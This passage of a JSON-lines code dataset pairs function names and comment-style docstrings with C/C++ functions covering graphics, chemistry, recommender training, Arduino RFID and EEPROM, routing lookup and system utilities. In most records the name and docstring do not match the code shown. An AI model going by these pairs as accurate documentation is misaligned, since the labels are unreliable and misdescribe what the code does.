~srcPostPsFlags) == 0)\\n    {\\n        srcPipePoint = Pal::HwPipePostPs;\\n    }\\n    \/\/ Otherwise see if post-CS signaling is enough.\\n    else if ((flags & ~srcPostCsFlags) == 0)\\n    {\\n        srcPipePoint = Pal::HwPipePostCs;\\n    }\\n    \/\/ Otherwise we have to resort to post Blt signaling.\\n    else if ((flags & ~srcPostBltFlags) == 0)\\n    {\\n        srcPipePoint = Pal::HwPipePostBlt;\\n    }\\n    \/\/ Otherwise we have to resort to bottom-of-pipe signaling.\\n    else\\n    {\\n        srcPipePoint = Pal::HwPipeBottom;\\n    }\\n\\n    return srcPipePoint;\\n}'}","id":3453}
{"content":"{'function_name': 'cmdLs', 'docstring': '\/\/ TODO: deallocate String_vector?', 'code': 'int main(int argc, char ** argv) {\\n    \/\/ bin-path, host, cmd, path [, data]\\n    assert(argc >= 4);\\n\\n    std::string host(argv[1]), cmd(argv[2]), path(argv[3]), data;\\n\\n    if (cmd == \"create\") {\\n        assert(argc == 5);\\n        data = argv[4];\\n    } else if (cmd == \"ls\") {\\n        assert(argc == 4);\\n    } else {\\n        abort();\\n    }\\n\\n    zhandle_t * handler = connect(host);\\n\\n    if (cmd == \"create\") {\\n        cmdCreate(handler, path, data);\\n    } else if (cmd == \"ls\") {\\n        cmdLs(handler, path);\\n    }\\n\\n    return 0;\\n}'}","id":3464}
{"content":"{'function_name': 'fileconv', 'docstring': '\/\/ This is a kludge for the selimsteg infrastructure', 'code': 'static int\\nfileconv (data_source_and_type<Molecule> & input,\\n          Molecule_Output_Object & output_object)\\n{\\n  Molecule * m;\\n  while (NULL != (m = input.next_molecule()))\\n  {\\n\/\/  std::unique_ptr<Molecule> free_m(m);\\n    std::unique_ptr<Molecule> free_m(m);\\n\\n    molecules_read++;\\n\\n    if (debug_print_each_molecule)\\n    {\\n      m->compute_aromaticity_if_needed();\\n      do_debug_print(*m, cerr);\\n    }\\n    \\n    if (! fileconv(*m, output_object))\\n      return 0;\\n  }\\n\\n\/\/cerr << \"At end of loop, \" << input.connection_table_errors_encountered() << endl;\\n\\n  if (input.stopped_because_of_error())\\n    return 0;\\n\\n  return 1;\\n}'}","id":3470}
{"content":"{'function_name': 'calc_Estart', 'docstring': '\/\/ size_t size = matrix.size();', 'code': 'double calc_GiniIndex(vector<vector<double>>& matrix) {\\n    vector<double> attrSum;\\n    vector<double> clsSum;\\n    double allSum;\\n    getSumRowCol(matrix, attrSum, clsSum, allSum);\\n    \/\/ size_t size = matrix.size();\\n    double ret = 0;\\n    for (size_t col = 0; col < matrix[0].size(); col++) {\\n        double num = 0;\\n        for (size_t row = 0; row < matrix.size(); row++) {\\n            num += (matrix[row][col] * matrix[row][col]);\\n        }\\n        if (attrSum[col] > 0) {\\n            ret += (num \/ attrSum[col]);\\n        }\\n    }\\n    ret = 1. - ret \/ allSum;\\n    return ret;\\n}'}","id":3471}
{"content":"{'function_name': 'main', 'docstring': '\/\/ re-writing\/updating EMPLOYEE DATA\\r', 'code': 'vector<Employee> storeVectEmp(vector<Employee> vectEmp, vector<string> empData) {\\r\\n    Employee emp;\\r\\n\\r\\n    emp.name = empData[0];\\r\\n    emp.id = stoi(empData[1]);\/\/ converting string to int\\r\\n\\r\\n    vectEmp.push_back(emp);\\r\\n\\r\\n    return vectEmp;\\r\\n}'}","id":3472}
{"content":"{'function_name': 'train_model_from_UV', 'docstring': '\/\/ Stochastic gradient descent', 'code': 'svd_ans complete_training(double eta, double reg) {\\n    \/\/ Four arrays to store all the training data read in\\n    int* user_matrix = new int[TRAIN_SIZE];\\n    short* movie_matrix = new short[TRAIN_SIZE];\\n    short* date_matrix = new short[TRAIN_SIZE];\\n    double* rating_matrix = new double[TRAIN_SIZE];\\n\\n    \/\/ Four arrays to store all the validation data read in\\n    int* user_matrix_val = new int[VALID_SIZE];\\n    short* movie_matrix_val = new short[VALID_SIZE];\\n    short* date_matrix_val = new short[VALID_SIZE];\\n    double* rating_matrix_val = new double[VALID_SIZE];\\n\\n\\n\\t\/\/ IO\\n    ifstream inFile;\\n    ofstream outFile;\\n\\n\\n\\n    \/\/ Read training data\\n    cout << \"\\\\nReading training input.\" << endl;\\n    inFile.open(TRAIN_IN_FILENAME);\\n    if (!inFile) {\\n        std::cout << \"File not opened.\" << endl;\\n        exit(1);\\n    }\\n    for (long i=0; i<TRAIN_SIZE; i++) {\\n        inFile >> user_matrix[i];\\n\\t\\tinFile >> movie_matrix[i];\\n\\t\\tinFile >> date_matrix[i];\\n\\t\\tinFile >> rating_matrix[i];\\n        if (i % 100000 == 0) {\\n            cout << \"\\\\r\" << to_string(i * 100 \/ TRAIN_SIZE) << \"%%\" << flush;\\n        }\\n    }\\n    cout << endl;\\n    inFile.close();\\n\\n\\n\\tpopulate_movies_to_array(user_matrix, movie_matrix, rating_matrix);\\n\\n    \/\/ Read validation data\\n    cout << \"Reading validation input.\" << endl;\\n    inFile.open(VALID_IN_FILENAME);\\n    if (!inFile) {\\n        std::cout << \"File not opened.\" << endl;\\n        exit(1);\\n    }\\n    for (long i=0; i<VALID_SIZE; i++) {\\n        inFile >> user_matrix_val[i];\\n\\t\\tinFile >> movie_matrix_val[i];\\n\\t\\tinFile >> date_matrix_val[i];\\n\\t\\tinFile >> rating_matrix_val[i];\\n        if (i % 100000 == 0) {\\n            cout << \"\\\\r\" << to_string(i * 100 \/ VALID_SIZE) << \"%%\" << flush;\\n        }\\n    }\\n    cout << endl;\\n    inFile.close();\\n\\n\\t\/\/ cout<<\" Reading out test data \" <<endl;\\n\\t\/\/ \/\/ Read in training data\\n    \/\/ ifstream inFile_test;\\n\\t\/\/ inFile_test.open(TEST_IN_FILENAME);\\n    \/\/ int* user_matrix_test = new int[TEST_SIZE];\\n    \/\/ short* movie_matrix_test = new short[TEST_SIZE];\\n    \/\/ short* date_matrix_test = new short[TEST_SIZE];\\n    \/\/ int garbage_zero_rating;\\n    \/\/ for (long i=0; i<TEST_SIZE; i++) {\\n    \/\/     inFile_test >> user_matrix_test[i];\\n    \/\/     inFile_test >> movie_matrix_test[i];\\n    \/\/     inFile_test >> date_matrix_test[i];\\n    \/\/     inFile_test >> garbage_zero_rating;\\n    \/\/     if (i % 100 == 0) {\\n    \/\/         cout << \"\\\\r\" << to_string(i * 100 \/ TEST_SIZE) << \"%%\" << flush;\\n    \/\/     }\\n    \/\/ }\\n    \/\/ cout << endl;\\n    \/\/ inFile_test.close();\\n\\n\\n\\n\\n    double regs[]   = {0.0015, 0.015, 0.05};\\n    double reg_y[] = {0.0015, 0.015, 0.05};\\n\\n    outFile.open(\"Grid_Search_svd++_\"+to_string(LATENT_FACTORS)+\"_1.log\");\\n\\tsvd_ans result;\\n\\n\\tdouble lowestRMSE = 100;\\n\\tdouble best_REGULARIZATION_Y  = -1;\\n\\tdouble best_REGULARIZATION = -1;\\n\\n    for (int i1 = 0; i1 < 3; i1++) {\\n        REGULARIZATION = regs[i1];\\n    for (int i2 = 0; i2 < 3; i2++) {\\n        REGULARIZATION_Y = reg_y[i2];\\n\\n        \/\/ Create U matrix\\n        double** U = new double* [USER_SIZE];\\n        \/\/ Create V matrix\\n        double** V = new double* [MOVIE_SIZE];\\n        \/\/ Create y array\\n        double** y = new double* [MOVIE_SIZE];\\n        \/\/ Create the part of the y array that will be used for the gradient\\n        double** SumMW = new double* [USER_SIZE];\\n\\n    \\tdouble* bi = new double [MOVIE_SIZE];\\n    \\tdouble* bu = new double [USER_SIZE];\\n\\n\\n\\n        \/\/ Initialize the matrices\\n        for(int j = 0; j < MOVIE_SIZE; j++){\\n            V[j] = new double[LATENT_FACTORS];\\n            y[j] = new double[LATENT_FACTORS];\\n            bi[j] = 0.0;\\n            for(int k = 0; k < LATENT_FACTORS; k++){\\n                srand ( unsigned ( time(0) ) );\\n                V[j][k] = 0.1 * (rand() \/ (RAND_MAX + 1.0)) \/ sqrt(LATENT_FACTORS);\\n                y[j][k] = 0;\\n            }\\n        }\\n        for(int i = 0; i < USER_SIZE; i++){\\n            U[i] = new double[LATENT_FACTORS];\\n            SumMW[i] = new double[LATENT_FACTORS];\\n            bu[i] = 0.0;\\n            for(int k = 0; k < LATENT_FACTORS; k++){\\n                U[i][k] = 0.1 * (rand() \/ (RAND_MAX + 1.0)) \/ sqrt(LATENT_FACTORS);\\n                SumMW[i][k] = 0.1 * (rand() \/ (RAND_MAX + 1.0)) \/ sqrt(LATENT_FACTORS);\\n            }\\n        }\\n\\n        \/\/ Train SVD\\n        cout << \"Training model.\" << endl;\\n\\n        \/\/ MatrixXd U = MatrixXd::Random(USER_SIZE, LATENT_FACTORS);\\n        \/\/ MatrixXd V = MatrixXd::Random(LATENT_FACTORS, MOVIE_SIZE);\\n    \\t\/\/ MatrixXd y = MatrixXd::Random(MOVIE_SIZE, LATENT_FACTORS);\\n    \\t\/\/ MatrixXd SumMW = MatrixXd::Random(USER_SIZE, LATENT_FACTORS);\\n\\n        result = train_model_from_UV(eta, reg,\\n                                            user_matrix, movie_matrix,\\n                                            date_matrix, rating_matrix,\\n                                            user_matrix_val, movie_matrix_val,\\n                                            date_matrix_val, rating_matrix_val,\\n                                            U, V, y, SumMW,user_matrix_val,\\n                                            movie_matrix_val, date_matrix_val,\\n                                            bu,bi);\\n\\n        if (result.E_val < lowestRMSE) {\\n\\t\\t\\tbest_REGULARIZATION_Y    = REGULARIZATION_Y;\\n\\t\\t\\tbest_REGULARIZATION      = REGULARIZATION;\\n\\t\\t\\tlowestRMSE = result.E_val;\\n\\t\\t}\\n\\t\\toutFile << \"REGULARIZATION      \" << REGULARIZATION << endl;\\n\\t\\toutFile << \"REGULARIZATION_Y    \" << REGULARIZATION_Y << endl;\\n\\t\\toutFile << \"e_val: \" << result.E_val << endl;\\n\\t\\toutFile << \"----------------------------\" << endl << endl;\\n\\n\\n        for (long r = 0; r < USER_SIZE;  r++) { delete[] U[r]; }\\n        for (long r = 0; r < MOVIE_SIZE; r++) { delete[] V[r]; }\\n        for (long r = 0; r < MOVIE_SIZE; r++) { delete[] y[r]; }\\n        for (long r = 0; r < USER_SIZE;  r++) { delete[] SumMW[r]; }\\n        delete[] U;\\n        delete[] V;\\n        delete[] y;\\n        delete[] SumMW;\\n    }\\n    }\\n\\n\\t\/\/ delete[] user_matrix_test;\\n    \/\/ delete[] movie_matrix_test;\\n    \/\/ delete[] date_matrix_test;\\n    delete[] rating_matrix;\\n\\tdelete[] user_matrix;\\n\\tdelete[] movie_matrix;\\n    delete[] date_matrix;\\n    delete[] rating_matrix_val;\\n\\tdelete[] user_matrix_val;\\n\\tdelete[] movie_matrix_val;\\n    delete[] date_matrix_val;\\n\\n    return result;\\n}'}","id":3474}
{"content":"{'function_name': 'setup', 'docstring': '\/\/ Init MFRC522 card', 'code': 'void loop()   \\n{\\n  Blynk.run();\\n  if ( ! mfrc522.PICC_IsNewCardPresent()) \\n  {\\n    return;\\n  }\\n  \/\/ Select one of the cards\\n  if ( ! mfrc522.PICC_ReadCardSerial()) \\n  {\\n    return;\\n  }\\n  \/\/Show UID on serial monitor\\n  Serial.print(\"UID tag :\");\\n  String content= \"\";\\n  byte letter;\\n  for (byte i = 0; i < mfrc522.uid.size; i++) \\n  {\\n     Serial.print(mfrc522.uid.uidByte[i] < 0x10 ? \" 0\" : \" \");\\n     Serial.print(mfrc522.uid.uidByte[i], HEX);\\n     content.concat(String(mfrc522.uid.uidByte[i] < 0x10 ? \" 0\" : \" \"));\\n     content.concat(String(mfrc522.uid.uidByte[i], HEX));\\n  }\\n  Serial.println();\\n  Serial.print(\"Message : \");\\n  content.toUpperCase();  \\n    \\n  if(content.substring(1) == \"B9 9F AE B3\") \/\/ UID kartu nya silahkan cocokan dengan kartu masing masing\\n          {\\n            lcd.clear();\\n            lcd.print(0, 0, \"Valid card\");                                              \/\/ Print if card is TRUE\\n            lcd.print(0, 1, \"Access Granted\");\\n            delay(1000);      \\n          } \\n         else if(content.substring(1) == \"8F AA 2B 20\") \/\/ UID kartu nya silahkan cocokan dengan kartu masing\"\\n          {\\n            lcd.clear();\\n            lcd.print(0, 0, \"Valid card\");                                              \/\/ Print if card is TRUE\\n            lcd.print(0, 1, \"Access Granted\");\\n            delay(1000);      \\n          }\\n                          \\n          else\\n          {                  \\n            lcd.clear();\\n            lcd.print(0, 0, \"Invalid card\");                                   \/\/ Print if card is FALSE\\n            lcd.print(0, 1, \"Access Denied\");\\n          }                           \\n          \\n}'}","id":3480}
{"content":"{'function_name': 'do_make_implicit_hydrogens_explicit', 'docstring': '\/\/ the number of atoms to which we add a Hydrogen', 'code': 'static void\\ndo_sort_by_fragment_size (Molecule & m)\\n{\\n  int nf = m.number_fragments();\\n\\n  if (1 == nf)\\n    return;\\n\\n  resizable_array<int> fragment_size;\\n\\n  for (int i = 0; i < nf; i++)\\n  {\\n    int a = m.atoms_in_fragment(i);\\n\\n    fragment_size.add_if_not_already_present(a);\\n  }\\n\\n  int n = fragment_size.number_elements();\\n\\n  if (1 == n)   \/\/ all frags the same size\\n    return;\\n\\n  Int_Comparator_Smaller ics;\\n\\n  fragment_size.iwqsort(ics);\\n\\n#ifdef DEBUG_DO_SORT_BY_FRAGMENT_SIZE\\n  cerr << n << \" different fragment sizes\\\\n\";\\n  for (int i = 0; i < n; i++)\\n  {\\n    cerr << fragment_size[i] << \" atoms\\\\n\";\\n  }\\n#endif\\n\\n\/\/ Figure out the order in which existing atoms will be placed in the final molecule\\n\\n  const int matoms = m.natoms();\\n\\n  resizable_array<int> new_atom_order(matoms);\\n\\n  for (int i = 0; i < n; i++)\\n  {\\n    const int a1 = fragment_size[i];\\n\\n    for (int j = 0; j < matoms; j++)\\n    {\\n      int f = m.fragment_membership(j);\\n      if (a1 == m.atoms_in_fragment(f))\\n        new_atom_order.add(j);\\n    }\\n  }\\n\\n#ifdef DEBUG_DO_SORT_BY_FRAGMENT_SIZE\\n  for (int i = 0; i < matoms; i++)\\n  {\\n    cerr << \"i = \" << i << \" new_atom_order \" << new_atom_order[i] << endl;\\n  }\\n#endif\\n\\n  assert(new_atom_order.number_elements() == matoms);\\n\\n\/\/ Each atom knows it\\'s starting atom number\\n\\n  int * tmp = new int[matoms]; std::unique_ptr<int[]> free_tmp(tmp);\\n\\n  for (int i = 0; i < matoms; i++)\\n  {\\n    tmp[i] = i;\\n    m.set_user_specified_atom_void_ptr(i, tmp + i);\\n  }\\n\\n\/\/ This is really hairy.... Make a swap, then keep swapping atoms\\n\/\/ until the destination gets it\\'s final atom in place\\n\\n  for (int i = 0; i < matoms; i++)\\n  {\\n    int j = new_atom_order[i];\\n\\n    atom_number_t zatom = i;\\n\\n    while (1)\\n    {\\n      const int * u = reinterpret_cast<const int *>(m.user_specified_atom_void_ptr(zatom));\\n\\n\/\/    cerr << \"zatom \" << zatom << \" compare \" << *u << \" and \" << j << endl;\\n      if (*u == j)\\n        break;\\n\\n\/\/    cerr << \"i = \" << i << \" swap \" << zatom << \" and \" << j << endl;\\n\\n      m.swap_atoms(zatom, j);\\n\\n      for (int k = i + 1; k < matoms; k++)\\n      {\\n        if (new_atom_order[k] == *u)\\n        {\\n          zatom = k;\\n          break;\\n        }\\n      }\\n\\n      if (zatom == j)\\n        break;\\n    }\\n  }\\n\\n  return;\\n}'}","id":3484}
{"content":"{'function_name': 'colorMap', 'docstring': '\/\/ FORNOW', 'code': 'bool checkVectorXd(const VectorXd &G_FD, const VectorXd &G_analytic, const bool &printEverything = false, const double &scale = 1.) {\\n\\tif (G_FD.size() != G_analytic.size()) { cout << string_format(\"VectorXd size mismatch (%d, %d)\", G_FD.size(), G_analytic.size()) << endl; throw std::runtime_error(\"\"); }\\n\\t\/\/ --\\n\\tbool ret = true;\\n\\tfor (int i = 0; i < G_FD.size(); i++) {\\n\\t\\tdouble g1 = scale * G_FD[i];\\n\\t\\tdouble g2 = scale * G_analytic[i];\\n\\t\\tdouble err = g1 - g2;\\n\\t\\tbool match = true;\\n\\t\\tbool print = printEverything;\\n\\t\\tif ((fabs(err) > 0.0001 && (2. * fabs(err) \/ (fabs(g1) + fabs(g2))) > 0.001)\\n\\t\\t\\t|| isNaN(g1) || isNaN(g2) || isinf(g1) || isinf(g2)) {\\n\\t\\t\\tret = false;\\n\\t\\t\\tmatch = false;\\n\\t\\t\\tprint = true;\\n\\t\\t}\\n\\t\\tif (print) {\\n\\t\\t\\tcout << string_format(string((match) ? \"[MATCH]    \" : \"[MISMATCH] \") + \"--> %lf * g_%d: FD: %lf, anal: %lf, helpers_error: %lf\", scale, i, g1, g2, err) << endl;\\n\\t\\t}\\n\\t}\\n\\treturn ret;\\n}'}","id":3486}
{"content":"{'function_name': 'PyScrollWidget', 'docstring': '\/\/ If making a new widget add it at the end.', 'code': 'static auto PyHScrollWidget(PyObject* self, PyObject* args, PyObject* keywds)\\n    -> PyObject* {\\n  BA_PYTHON_TRY;\\n\\n  PyObject* size_obj = Py_None;\\n  PyObject* pos_obj = Py_None;\\n  PyObject* background_obj = Py_None;\\n  PyObject* selected_child_obj = Py_None;\\n  PyObject* capture_arrows_obj = Py_None;\\n  PyObject* on_select_call_obj = Py_None;\\n  PyObject* parent_obj = Py_None;\\n  PyObject* edit_obj = Py_None;\\n  PyObject* center_small_content_obj = Py_None;\\n  ContainerWidget* parent_widget = nullptr;\\n  PyObject* color_obj = Py_None;\\n  PyObject* highlight_obj = Py_None;\\n  PyObject* border_opacity_obj = Py_None;\\n  PyObject* simple_culling_h_obj = Py_None;\\n  PyObject* claims_left_right_obj = Py_None;\\n  PyObject* claims_up_down_obj = Py_None;\\n  PyObject* claims_tab_obj = Py_None;\\n  PyObject* autoselect_obj = Py_None;\\n\\n  static const char* kwlist[] = {\"edit\",\\n                                 \"parent\",\\n                                 \"size\",\\n                                 \"position\",\\n                                 \"background\",\\n                                 \"selected_child\",\\n                                 \"capture_arrows\",\\n                                 \"on_select_call\",\\n                                 \"center_small_content\",\\n                                 \"color\",\\n                                 \"highlight\",\\n                                 \"border_opacity\",\\n                                 \"simple_culling_h\",\\n                                 \"claims_left_right\",\\n                                 \"claims_up_down\",\\n                                 \"claims_tab\",\\n                                 \"autoselect\",\\n                                 nullptr};\\n\\n  if (!PyArg_ParseTupleAndKeywords(\\n          args, keywds, \"|OOOOOOOOOOOOOOOO\", const_cast<char**>(kwlist),\\n          &edit_obj, &parent_obj, &size_obj, &pos_obj, &background_obj,\\n          &selected_child_obj, &capture_arrows_obj, &on_select_call_obj,\\n          &center_small_content_obj, &color_obj, &highlight_obj,\\n          &border_opacity_obj, &simple_culling_h_obj, &claims_left_right_obj,\\n          &claims_up_down_obj, &claims_tab_obj, &autoselect_obj))\\n    return nullptr;\\n\\n  if (!g_base->CurrentContext().IsEmpty()) {\\n    throw Exception(\"UI functions must be called with no context set.\");\\n  }\\n\\n  \/\/ Grab the edited widget or create a new one.\\n  Object::Ref<HScrollWidget> widget;\\n  if (edit_obj != Py_None) {\\n    widget = dynamic_cast<HScrollWidget*>(UIV1Python::GetPyWidget(edit_obj));\\n    if (!widget.Exists()) {\\n      throw Exception(\"Invalid or nonexistent edit widget.\",\\n                      PyExcType::kWidgetNotFound);\\n    }\\n  } else {\\n    parent_widget = parent_obj == Py_None\\n                        ? g_ui_v1->screen_root_widget()\\n                        : dynamic_cast<ContainerWidget*>(\\n                            UIV1Python::GetPyWidget(parent_obj));\\n    if (!parent_widget) {\\n      throw Exception(\"Invalid or nonexistent parent widget.\",\\n                      PyExcType::kWidgetNotFound);\\n    }\\n    widget = Object::New<HScrollWidget>();\\n  }\\n\\n  \/\/ set applicable values ----------------------------\\n  if (size_obj != Py_None) {\\n    Point2D p = Python::GetPyPoint2D(size_obj);\\n    widget->SetWidth(p.x);\\n    widget->SetHeight(p.y);\\n  }\\n  if (pos_obj != Py_None) {\\n    Point2D p = Python::GetPyPoint2D(pos_obj);\\n    widget->set_translate(p.x, p.y);\\n  }\\n  if (highlight_obj != Py_None) {\\n    widget->set_highlight(Python::GetPyBool(highlight_obj));\\n  }\\n  if (border_opacity_obj != Py_None) {\\n    widget->setBorderOpacity(Python::GetPyFloat(border_opacity_obj));\\n  }\\n  if (on_select_call_obj != Py_None) {\\n    widget->SetOnSelectCall(on_select_call_obj);\\n  }\\n  if (center_small_content_obj != Py_None) {\\n    widget->SetCenterSmallContent(Python::GetPyBool(center_small_content_obj));\\n  }\\n  if (color_obj != Py_None) {\\n    std::vector<float> c = Python::GetPyFloats(color_obj);\\n    if (c.size() != 3) {\\n      throw Exception(\"Expected 3 floats for color.\", PyExcType::kValue);\\n    }\\n    widget->setColor(c[0], c[1], c[2]);\\n  }\\n  if (capture_arrows_obj != Py_None) {\\n    widget->set_capture_arrows(Python::GetPyBool(capture_arrows_obj));\\n  }\\n  if (background_obj != Py_None) {\\n    widget->set_background(Python::GetPyBool(background_obj));\\n  }\\n  if (simple_culling_h_obj != Py_None) {\\n    widget->set_simple_culling_h(Python::GetPyFloat(simple_culling_h_obj));\\n  }\\n  if (selected_child_obj != Py_None) {\\n    widget->SelectWidget(UIV1Python::GetPyWidget(selected_child_obj));\\n  }\\n  if (claims_left_right_obj != Py_None) {\\n    widget->set_claims_left_right(Python::GetPyBool(claims_left_right_obj));\\n  }\\n  if (claims_up_down_obj != Py_None) {\\n    widget->set_claims_up_down(Python::GetPyBool(claims_up_down_obj));\\n  }\\n  if (claims_tab_obj != Py_None) {\\n    widget->set_claims_tab(Python::GetPyBool(claims_tab_obj));\\n  }\\n  if (autoselect_obj != Py_None) {\\n    widget->set_auto_select(Python::GetPyBool(autoselect_obj));\\n  }\\n\\n  \/\/ if making a new widget add it at the end\\n  if (edit_obj == Py_None) {\\n    g_ui_v1->AddWidget(widget.Get(), parent_widget);\\n  }\\n  return widget->NewPyRef();\\n\\n  BA_PYTHON_CATCH;\\n}'}","id":3495}
{"content":"{'function_name': 'writeSSIDToEEPROM', 'docstring': '\/\/Clear EEPROM before Writing', 'code': 'void readSSIDFromEEPROM(char ESP_SSID[], char ESP_PSK[])\\n{\\n  int eeprom_i = 0;\\n  byte val;\\n\\n  EEPROM.begin(512);\\n\\n  val = EEPROM.read(eeprom_i);\\n  eeprom_i += 1;\\n\\n  if (val == 0xFF)\\n  {\\n    Serial.println(\"Error: Program has not written to EEPROM!\");\\n    return;\\n  }\\n\\n  int ssid_sizeof = val;\\n  char ssid[ssid_sizeof];\\n\\n  for (int i = 0; i < ssid_sizeof; i++)\\n  {\\n    val = EEPROM.read(eeprom_i);\\n    ssid[i] = val;\\n    eeprom_i += 1;\\n  }\\n\\n  val = EEPROM.read(eeprom_i);\\n  eeprom_i += 1;\\n\\n  int psk_sizeof = val;\\n  char psk[psk_sizeof];\\n\\n  for (int i = 0; i < psk_sizeof; i++)\\n  {\\n    val = EEPROM.read(eeprom_i);\\n    psk[i] = val;\\n    eeprom_i += 1;\\n  }\\n\\n  EEPROM.end();\\n\\n  Serial.println(\"Successfully read EEPROM!\");\\n  Serial.print(\"SSID: \");\\n  Serial.println(ssid);\\n  Serial.print(\"PSK: \");\\n  Serial.println(psk);\\n\\n  \/\/ Return through setting ESP_SSID & ESP_PSK\\n  ESP_SSID = ssid;\\n  ESP_PSK = psk;\\n}'}","id":3509}
{"content":"{'function_name': 'preprocess', 'docstring': '\/\/current delimitor for nexthop in each line', 'code': 'int lookup(string address, map<string,node*>* array){\\n\\t\/\/Function purpose is to lookup the hash tables and find out the LPM using binary search on prefix length. BSOL namely!\\n\\tint max = 32, min = 0;  \/\/never 0\\n\\tstring bmp = \"\";\\n\\tint mask = -1, nexthop = -1;\\n\\tint middle = (max + min)\/2;\\n\\t\/\/cout << \"address: \" << address << endl;\\n\\t\\n\\twhile(min <= max && middle > 0 && middle < 32){\\n\\t\\tstring key = getLessPrefix(address,middle);\\n\\t\\tmap<string,node*>::iterator it = array[middle-1].find(key);\\n\\t\\tif(it != array[middle-1].end()){\/\/exist a node in the table!\\n\\t\\t\\tnode* current = it->second;\\n\\t\\t\\tif(current->getFlag() == 0){\/\/pure prefix.done!\\n\\t\\t\\t\\t\/\/cout << \"LPM inside: \" << current->getBmp() << endl;\\n\\t\\t\\t\\t\/\/cout << \"mask inside: \" << middle << endl;\\n\\t\\t\\t\\treturn current->getNexthop();\\n\\t\\t\\t}else{\/\/hybrid or pure marker node.\\n\\t\\t\\t\\tbmp = current->getBmp();\\n\\t\\t\\t\\tmask = current->getMask();\\n\\t\\t\\t\\tnexthop = current->getNexthop();\\n\\t\\t\\t}\\n\\t\\t\\t\/\/direction: longer prefix length tables\\n\\t\\t\\tmin = middle+1;\\n\\t\\t}else{\\n\\t\\t\\tmax = middle-1;\\n\\t\\t}\\n\\t\\tmiddle = (max + min)\/2;\\n\\t\\t\/\/cout << \"current hash table len: \" << middle << endl;\\n\\t}\\n\\t\/\/cout << \"LPM out: \" << bmp << endl;\\n\\t\/\/cout << \"mask out: \" << mask << endl;\\n\\treturn nexthop;\\n}'}","id":3513}
{"content":"{'function_name': 'make_desc', 'docstring': '\/\/ underscore\/dot -> space', 'code': 'std::map<std::string, std::string>\\nbtrfs_show_super (const std::string& dev)\\n{\\n\\tstd::string command;\\n\\tstd::vector<std::string> output;\\n\\tstd::map<std::string, std::string> results;\\n\\n\\tcommand = \"btrfs-show-super \" + dev;\\n\\tint retval = execute_command_out (command, output);\\n\\t\/* retval:\\n\\t *\\t0 match,    magic _BHRfS_M [match]\\n\\t *\\t0 no match, magic ........ [DON\\'T MATCH]\\n\\t *\\t1 device doesn\\'t exist\\n\\t *\\t1 invalid arguments\\n\\t *\/\\n\\n\\tif (retval != 0) {\\n\\t\\treturn {};\\n\\t}\\n\\n\\tstd::string key;\\n\\tstd::string value;\\n\\n\\tlog_debug (\"keys:\");\\n\\tfor (auto& line : output) {\\n\\t\\t\/\/XXX move these two tests before loop and doctor vector\\n\\t\\tif (line.substr (0, 11) == \"superblock:\") {\\n\\t\\t\\tstd::string dev2;\\n\\t\\t\\tif (!parse_header (line, dev2)) {\\n\\t\\t\\t\\tlog_debug (\"btrfs: bad header\");\\n\\t\\t\\t\\tbreak;\\n\\t\\t\\t}\\n\\t\\t\\tif (dev != dev2) {\\n\\t\\t\\t\\tlog_debug (\"btrfs: devices don\\'t match\");\\n\\t\\t\\t\\tbreak;\\n\\t\\t\\t}\\n\\t\\t\\tcontinue;\\n\\t\\t} else if (line.substr (0, 10) == \"----------\") {\\n\\t\\t\\tcontinue;\\n\\t\\t} else if (line.empty()) {\\n\\t\\t\\tcontinue;\\n\\t\\t} else if (!parse_line (line, key, value)) {\\n\\t\\t\\tlog_debug (\"btrfs failed: %s\", SP(line));\\n\\t\\t\\tcontinue;\\n\\t\\t}\\n\\n\\t\\tlog_debug (\"\\\\t%s\", SP(key));\\n\\t\\tresults[key] = value;\\n\\t}\\n\\n\\treturn results;\\n}'}","id":3515}
{"content":"{'function_name': 'calcCommonLine', 'docstring': '\/\/Common line (p + t e) between two planes  (r0(0) x + r0(1) y + r0(2) z + r0(3) = 0) and (r1(0) x + r1(1) y + r1(2) z + r1(3) = 0)', 'code': 'int sol2(double xa[3], double xz[2]) {\\n    if(xa[2]*xa[2] <= ALM0*ALM0){\\n        if(xa[1]*xa[1] <= ALM0*ALM0) return 0;\\n        xz[0] = xz[1] = -xa[0]\/xa[1];\\n        return 1;\\n    }\\n    double D = xa[1] * xa[1] - 4.0 * xa[2] * xa[0];\\n\/\/\\tcout << \"D\"<< D << \" \"<<xa[2] << \" \"<<xa[1] << \" \"<<xa[0] << endl;\\n    if (D < -ALM0*ALM0) return 0;\\n    if (D < 0) D = 0;\\n    double cx = sqrt(D);\\n    xz[0] = (-xa[1] + cx) \/ (2.0 * xa[2]);\\n    xz[1] = (-xa[1] - cx) \/ (2.0 * xa[2]);\\n    return 2;\\n}'}","id":3530}
{"content":"{'function_name': 'Agent', 'docstring': '\/* End of PORT_FORWARD  *\/', 'code': 'int AgentMonitor (char **pProcessName, int nProcessNameSize)\\n{\\n    int nPID = RETURN_SUCCESS;\\n    int nReturnValue = RETURN_SUCCESS;\\n    struct sProcessInfo *pProcessInfo;\\n\\n    DEBUG_PRINT (DEBUG_LOG, \"\\\\nStarting Agent Monitoring..\\\\n\");\\n    \/* Populating structure members for process info *\/\\n    pProcessInfo = (struct sProcessInfo*) malloc (sizeof (struct sProcessInfo) );\\n    pProcessInfo -> pProcessName = pProcessName;\\n    pProcessInfo -> nProcessNameSize = nProcessNameSize;\\n\\n    \/* Registering signals to signal handler *\/\\n    if (signal (SIGTERM, SignalHandler) == SIG_ERR)\\n    {\\n        DEBUG_PRINT (DEBUG_ERROR, \"Alert!!! Error signal SIGTERM will not be handled \\\\n\");\\n    }\\n\\n    if (signal (SIGINT, SignalHandler) == SIG_ERR)\\n    {\\n        DEBUG_PRINT (DEBUG_ERROR, \"Alert!!! Error signal SIGINT will not be handled \\\\n\");\\n    }\\n\\n    TcpSocketServer go_Monitor(ANY_ADDR, RDK_AGENT_MONITOR_PORT);\\n    RpcMethods o_Monitor(go_Monitor);\\n\\n    if (!o_Monitor.StartListening())\\n    {\\n        DEBUG_PRINT (DEBUG_ERROR, \"Alert!!! Agent Monitoring Listen failed \\\\n\");\\n\\n        return RETURN_FAILURE;   \/\/ Returns failure if Listen failed\\n\\n    }\\n\\n    \/* Starting a thread for agent execution *\/\\n    nReturnValue = pthread_create (&agentExecuterThreadId, NULL, AgentExecuter, (void *)(pProcessInfo));\\n    if(nReturnValue != RETURN_SUCCESS)\\n    {\\n        DEBUG_PRINT (DEBUG_ERROR, \"\\\\nAlert!!! Failed to start execute Agent  \\\\n\");\\n\\n        return RETURN_FAILURE;   \/\/ Returns failure if failed to start agent execution thread\\n\\n    }\\n\\n    while (s_bAgentMonitorRun)\\n    {\\n        waitpid (-1, NULL, WNOHANG | 